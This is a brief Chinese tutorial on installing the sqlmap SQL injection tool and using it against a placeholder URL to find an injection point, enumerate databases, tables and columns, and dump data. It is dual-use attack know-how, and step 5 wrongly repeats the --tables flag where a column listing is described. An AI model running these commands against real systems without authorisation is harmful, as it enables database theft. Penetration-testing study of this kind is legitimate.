## 简介

SQLmap是一款自动化的SQL注入工具，kali linux下为自带工具，其他系统则需自行下载安装

## 安装方法

在Windows下，在Github上下载SQLmap的发行版并解压

在Linux下，在确认python环境配置没问题后使用`sudo pip install sqlmap`命令进行安装

## 检测安装是否完成

Windows下，在确认python环境配置没问题后，在终端中使用`python sqlmap.py`或`pyhton sqlmap.py -h`命令进行检验

Linux下，在终端中使用 `sqlmap`命令进行检验

如出现下图即安装完成


![[Pasted image 20241125161040.png]]

## 查看帮助文档

使用`sqlmap -h`查看SQLmap帮助文档

## SQLmap的基本使用步骤

### 1、检测注入点

`sqlmap -u 'http://xx/?id=1'`

### 2、查看所有数据库

`sqlmap -u 'http://xx/?id=1' --dbs`

### 3、查看当前使用的数据库

`sqlmap -u 'http://xx/?id=1' --current-db`

### 4、查看数据表

`sqlmap -u 'http://xx/?id=1' -D 'db' --tables`

### 5、查看字段

`sqlmap -u 'http://xx/?id=1' -D 'db' -T 'tables' --tables`

### 6、查看数据

`sqlmap -u 'http://xx/?id=1' -D 'db' -T 'tables' --dump`
